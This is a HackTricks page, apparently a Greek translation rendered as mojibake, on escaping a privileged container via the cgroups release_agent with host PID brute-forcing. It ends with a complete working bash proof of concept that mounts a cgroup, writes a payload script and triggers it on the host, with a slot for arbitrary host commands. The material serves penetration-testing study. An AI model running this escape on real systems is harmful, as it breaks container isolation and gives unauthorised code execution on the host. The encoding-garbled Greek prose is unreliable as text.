{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
{% endhint %}

Î“Î¹Î± Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Î»ÎµÏ€Ï„Î¿Î¼Î­ÏÎµÎ¹ÎµÏ‚ **ÎµÎ»Î­Î³Î¾Ï„Îµ Ï„Î·Î½ Î±Î½Î¬ÏÏ„Î·ÏƒÎ· Ï„Î¿Ï… blog Î±Ï€ÏŒ [https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html](https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html)**. Î‘Ï…Ï„ÏŒ ÎµÎ¯Î½Î±Î¹ Î±Ï€Î»ÏÏ‚ Î¼Î¹Î± Ï€ÎµÏÎ¯Î»Î·ÏˆÎ·:

Î— Ï„ÎµÏ‡Î½Î¹ÎºÎ® Ï€ÎµÏÎ¹Î³ÏÎ¬Ï†ÎµÎ¹ Î¼Î¹Î± Î¼Î­Î¸Î¿Î´Î¿ Î³Î¹Î± **Ï„Î·Î½ ÎµÎºÏ„Î­Î»ÎµÏƒÎ· ÎºÏÎ´Î¹ÎºÎ± Ï„Î¿Ï… host Î±Ï€ÏŒ Î¼Î­ÏƒÎ± ÏƒÎµ Î­Î½Î± container**, Î¾ÎµÏ€ÎµÏÎ½ÏÎ½Ï„Î±Ï‚ Ï„Î¹Ï‚ Ï€ÏÎ¿ÎºÎ»Î®ÏƒÎµÎ¹Ï‚ Ï€Î¿Ï… Î¸Î­Ï„Î¿Ï…Î½ Î¿Î¹ ÏÏ…Î¸Î¼Î¯ÏƒÎµÎ¹Ï‚ Ï„Î¿Ï… storage-driver Ï€Î¿Ï… Î¸Î¿Î»ÏÎ½Î¿Ï…Î½ Ï„Î· Î´Î¹Î±Î´ÏÎ¿Î¼Î® Ï„Î¿Ï… filesystem Ï„Î¿Ï… container ÏƒÏ„Î¿Î½ host, ÏŒÏ€Ï‰Ï‚ Î¿Î¹ Kata Containers Î® ÏƒÏ…Î³ÎºÎµÎºÏÎ¹Î¼Î­Î½ÎµÏ‚ ÏÏ…Î¸Î¼Î¯ÏƒÎµÎ¹Ï‚ `devicemapper`.

Î’Î±ÏƒÎ¹ÎºÎ¬ Î²Î®Î¼Î±Ï„Î±:

1. **Î•Î½Ï„Î¿Ï€Î¹ÏƒÎ¼ÏŒÏ‚ Î¤Î±Ï…Ï„Î¿Ï„Î®Ï„Ï‰Î½ Î”Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¹ÏÎ½ (PIDs):** Î§ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î¿Î½ ÏƒÏ…Î¼Î²Î¿Î»Î¹ÎºÏŒ ÏƒÏÎ½Î´ÎµÏƒÎ¼Î¿ `/proc/<pid>/root` ÏƒÏ„Î¿ ÏˆÎµÏ…Î´Î¿-ÏƒÏÏƒÏ„Î·Î¼Î± Î±ÏÏ‡ÎµÎ¯Ï‰Î½ Linux, Î¿Ï€Î¿Î¹Î¿Î´Î®Ï€Î¿Ï„Îµ Î±ÏÏ‡ÎµÎ¯Î¿ ÎµÎ½Ï„ÏŒÏ‚ Ï„Î¿Ï… container Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï€ÏÎ¿ÏƒÏ€ÎµÎ»Î±ÏƒÏ„ÎµÎ¯ ÏƒÎµ ÏƒÏ‡Î­ÏƒÎ· Î¼Îµ Ï„Î¿ filesystem Ï„Î¿Ï… host. Î‘Ï…Ï„ÏŒ Ï€Î±ÏÎ±ÎºÎ¬Î¼Ï€Ï„ÎµÎ¹ Ï„Î·Î½ Î±Î½Î¬Î³ÎºÎ· Î½Î± Î³Î½Ï‰ÏÎ¯Î¶Î¿Ï…Î¼Îµ Ï„Î· Î´Î¹Î±Î´ÏÎ¿Î¼Î® Ï„Î¿Ï… filesystem Ï„Î¿Ï… container ÏƒÏ„Î¿Î½ host.
2. **PID Bashing:** Î§ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ Î¼Î¹Î± Ï€ÏÎ¿ÏƒÎ­Î³Î³Î¹ÏƒÎ· brute force Î³Î¹Î± Î½Î± Î±Î½Î±Î¶Î·Ï„Î·Î¸Î¿ÏÎ½ PIDs ÏƒÏ„Î¿Î½ host. Î‘Ï…Ï„ÏŒ Î³Î¯Î½ÎµÏ„Î±Î¹ ÎµÎ»Î­Î³Ï‡Î¿Î½Ï„Î±Ï‚ Î´Î¹Î±Î´Î¿Ï‡Î¹ÎºÎ¬ Ï„Î·Î½ Ï€Î±ÏÎ¿Ï…ÏƒÎ¯Î± ÎµÎ½ÏŒÏ‚ ÏƒÏ…Î³ÎºÎµÎºÏÎ¹Î¼Î­Î½Î¿Ï… Î±ÏÏ‡ÎµÎ¯Î¿Ï… ÏƒÏ„Î¿ `/proc/<pid>/root/<file>`. ÎŒÏ„Î±Î½ Î²ÏÎµÎ¸ÎµÎ¯ Ï„Î¿ Î±ÏÏ‡ÎµÎ¯Î¿, Ï…Ï€Î¿Î´ÎµÎ¹ÎºÎ½ÏÎµÎ¹ ÏŒÏ„Î¹ Î· Î±Î½Ï„Î¯ÏƒÏ„Î¿Î¹Ï‡Î· PID Î±Î½Î®ÎºÎµÎ¹ ÏƒÎµ Î¼Î¹Î± Î´Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¯Î± Ï€Î¿Ï… ÎµÎºÏ„ÎµÎ»ÎµÎ¯Ï„Î±Î¹ Î¼Î­ÏƒÎ± ÏƒÏ„Î¿ ÏƒÏ„Î¿Ï‡ÎµÏ…Î¼Î­Î½Î¿ container.
3. **Î•Î½ÎµÏÎ³Î¿Ï€Î¿Î¯Î·ÏƒÎ· Î•ÎºÏ„Î­Î»ÎµÏƒÎ·Ï‚:** Î— Î¼Î±Î½Ï„ÎµÎ¼Î­Î½Î· Î´Î¹Î±Î´ÏÎ¿Î¼Î® PID Î³ÏÎ¬Ï†ÎµÏ„Î±Î¹ ÏƒÏ„Î¿ Î±ÏÏ‡ÎµÎ¯Î¿ `cgroups release_agent`. Î‘Ï…Ï„Î® Î· ÎµÎ½Î­ÏÎ³ÎµÎ¹Î± ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹ÎµÎ¯ Ï„Î·Î½ ÎµÎºÏ„Î­Î»ÎµÏƒÎ· Ï„Î¿Ï… `release_agent`. Î— ÎµÏ€Î¹Ï„Ï…Ï‡Î¯Î± Î±Ï…Ï„Î¿Ï Ï„Î¿Ï… Î²Î®Î¼Î±Ï„Î¿Ï‚ ÎµÏ€Î¹Î²ÎµÎ²Î±Î¹ÏÎ½ÎµÏ„Î±Î¹ ÎµÎ»Î­Î³Ï‡Î¿Î½Ï„Î±Ï‚ Ï„Î· Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î¯Î± ÎµÎ½ÏŒÏ‚ Î±ÏÏ‡ÎµÎ¯Î¿Ï… ÎµÎ¾ÏŒÎ´Î¿Ï….

### Î”Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¯Î± Î•ÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ·Ï‚

Î— Î´Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¯Î± ÎµÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ·Ï‚ Ï€ÎµÏÎ¹Î»Î±Î¼Î²Î¬Î½ÎµÎ¹ Î­Î½Î± Ï€Î¹Î¿ Î»ÎµÏ€Ï„Î¿Î¼ÎµÏÎ­Ï‚ ÏƒÏÎ½Î¿Î»Î¿ ÎµÎ½ÎµÏÎ³ÎµÎ¹ÏÎ½, Î¼Îµ ÏƒÏ„ÏŒÏ‡Î¿ Ï„Î·Î½ ÎµÎºÏ„Î­Î»ÎµÏƒÎ· ÎµÎ½ÏŒÏ‚ payload ÏƒÏ„Î¿Î½ host Î¼Î±Î½Ï„ÎµÏÎ¿Î½Ï„Î±Ï‚ Ï„Î· ÏƒÏ‰ÏƒÏ„Î® PID Î¼Î¹Î±Ï‚ Î´Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¯Î±Ï‚ Ï€Î¿Ï… ÎµÎºÏ„ÎµÎ»ÎµÎ¯Ï„Î±Î¹ Î¼Î­ÏƒÎ± ÏƒÏ„Î¿ container. ÎÎ± Ï€ÏÏ‚ ÎµÎ¾ÎµÎ»Î¯ÏƒÏƒÎµÏ„Î±Î¹:

1. **Î‘ÏÏ‡Î¹ÎºÎ¿Ï€Î¿Î¯Î·ÏƒÎ· Î ÎµÏÎ¹Î²Î¬Î»Î»Î¿Î½Ï„Î¿Ï‚:** ÎˆÎ½Î± script payload (`payload.sh`) Ï€ÏÎ¿ÎµÏ„Î¿Î¹Î¼Î¬Î¶ÎµÏ„Î±Î¹ ÏƒÏ„Î¿Î½ host ÎºÎ±Î¹ Î´Î·Î¼Î¹Î¿Ï…ÏÎ³ÎµÎ¯Ï„Î±Î¹ Î­Î½Î±Ï‚ Î¼Î¿Î½Î±Î´Î¹ÎºÏŒÏ‚ Ï†Î¬ÎºÎµÎ»Î¿Ï‚ Î³Î¹Î± Ï„Î·Î½ Ï€Î±ÏÎ±ÎºÎ¿Î»Î¿ÏÎ¸Î·ÏƒÎ· cgroup.
2. **Î ÏÎ¿ÎµÏ„Î¿Î¹Î¼Î±ÏƒÎ¯Î± Payload:** Î¤Î¿ script payload, Ï„Î¿ Î¿Ï€Î¿Î¯Î¿ Ï€ÎµÏÎ¹Î­Ï‡ÎµÎ¹ Ï„Î¹Ï‚ ÎµÎ½Ï„Î¿Î»Î­Ï‚ Ï€Î¿Ï… Î¸Î± ÎµÎºÏ„ÎµÎ»Î¿ÏÎ½Ï„Î±Î¹ ÏƒÏ„Î¿Î½ host, Î³ÏÎ¬Ï†ÎµÏ„Î±Î¹ ÎºÎ±Î¹ ÎºÎ±Î¸Î¯ÏƒÏ„Î±Ï„Î±Î¹ ÎµÎºÏ„ÎµÎ»Î­ÏƒÎ¹Î¼Î¿.
3. **Î¡ÏÎ¸Î¼Î¹ÏƒÎ· Cgroup:** Î¤Î¿ cgroup Ï„Î¿Ï€Î¿Î¸ÎµÏ„ÎµÎ¯Ï„Î±Î¹ ÎºÎ±Î¹ ÏÏ…Î¸Î¼Î¯Î¶ÎµÏ„Î±Î¹. Î— ÏƒÎ·Î¼Î±Î¯Î± `notify_on_release` ÏÏ…Î¸Î¼Î¯Î¶ÎµÏ„Î±Î¹ Î³Î¹Î± Î½Î± Î´Î¹Î±ÏƒÏ†Î±Î»Î¯ÏƒÎµÎ¹ ÏŒÏ„Î¹ Ï„Î¿ payload ÎµÎºÏ„ÎµÎ»ÎµÎ¯Ï„Î±Î¹ ÏŒÏ„Î±Î½ Ï„Î¿ cgroup Î±Ï€ÎµÎ»ÎµÏ…Î¸ÎµÏÏ‰Î¸ÎµÎ¯.
4. **Brute Force PID:** ÎˆÎ½Î±Ï‚ Î²ÏÏŒÏ‡Î¿Ï‚ ÎµÏ€Î±Î½Î±Î»Î±Î¼Î²Î¬Î½ÎµÎ¹ Ï„Î¹Ï‚ Ï€Î¹Î¸Î±Î½Î­Ï‚ PIDs, Î³ÏÎ¬Ï†Î¿Î½Ï„Î±Ï‚ ÎºÎ¬Î¸Îµ Î¼Î±Î½Ï„ÎµÎ¼Î­Î½Î· PID ÏƒÏ„Î¿ Î±ÏÏ‡ÎµÎ¯Î¿ `release_agent`. Î‘Ï…Ï„ÏŒ Î¿Ï…ÏƒÎ¹Î±ÏƒÏ„Î¹ÎºÎ¬ Î¿ÏÎ¯Î¶ÎµÎ¹ Ï„Î¿ script payload Ï‰Ï‚ Ï„Î¿ `release_agent`.
5. **Î•Î½ÎµÏÎ³Î¿Ï€Î¿Î¯Î·ÏƒÎ· ÎºÎ±Î¹ ÎˆÎ»ÎµÎ³Ï‡Î¿Ï‚ Î•ÎºÏ„Î­Î»ÎµÏƒÎ·Ï‚:** Î“Î¹Î± ÎºÎ¬Î¸Îµ PID, Ï„Î¿ `cgroup.procs` Ï„Î¿Ï… cgroup Î³ÏÎ¬Ï†ÎµÏ„Î±Î¹, ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î·Î½ ÎµÎºÏ„Î­Î»ÎµÏƒÎ· Ï„Î¿Ï… `release_agent` Î±Î½ Î· PID ÎµÎ¯Î½Î±Î¹ ÏƒÏ‰ÏƒÏ„Î®. ÎŸ Î²ÏÏŒÏ‡Î¿Ï‚ ÏƒÏ…Î½ÎµÏ‡Î¯Î¶ÎµÏ„Î±Î¹ Î¼Î­Ï‡ÏÎ¹ Î½Î± Î²ÏÎµÎ¸ÎµÎ¯ Î· Î­Î¾Î¿Î´Î¿Ï‚ Ï„Î¿Ï… script payload, Ï…Ï€Î¿Î´ÎµÎ¹ÎºÎ½ÏÎ¿Î½Ï„Î±Ï‚ ÎµÏ€Î¹Ï„Ï…Ï‡Î·Î¼Î­Î½Î· ÎµÎºÏ„Î­Î»ÎµÏƒÎ·.

PoC Î±Ï€ÏŒ Ï„Î·Î½ Î±Î½Î¬ÏÏ„Î·ÏƒÎ· Ï„Î¿Ï… blog:
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

# Run a process for which we can search for (not needed in reality, but nice to have)
sleep 10000 &

# Prepare the payload script to execute on the host
cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh

OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}

# Commands to run on the host<
ps -eaf > \${OUTPATH} 2>&1
__EOF__

# Make the payload script executable
chmod a+x ${PAYLOAD_PATH}

# Set up the cgroup mount using the memory resource cgroup controller
mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

# Brute force the host pid until the output path is created, or we run out of guesses
TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID} :-("
exit 1
fi
fi
# Set the release_agent path to the guessed pid
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
# Trigger execution of the release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

# Wait for and cat the output
sleep 1
echo "Done! Output:"
cat ${OUTPUT_PATH}
```
{% hint style="success" %}
ÎœÎ¬Î¸ÎµÏ„Îµ & ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
ÎœÎ¬Î¸ÎµÏ„Îµ & ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Î¥Ï€Î¿ÏƒÏ„Î®ÏÎ¹Î¾Î· HackTricks</summary>

* Î•Î»Î­Î³Î¾Ï„Îµ Ï„Î± [**ÏƒÏ‡Î­Î´Î¹Î± ÏƒÏ…Î½Î´ÏÎ¿Î¼Î®Ï‚**](https://github.com/sponsors/carlospolop)!
* **Î•Î³Î³ÏÎ±Ï†ÎµÎ¯Ï„Îµ ÏƒÏ„Î·Î½** ğŸ’¬ [**Î¿Î¼Î¬Î´Î± Discord**](https://discord.gg/hRep4RUj7f) Î® ÏƒÏ„Î·Î½ [**Î¿Î¼Î¬Î´Î± telegram**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Î±Ï‚ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ ÎºÏŒÎ»Ï€Î± hacking Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs ÏƒÏ„Î±** [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
</details>
{% endhint %}
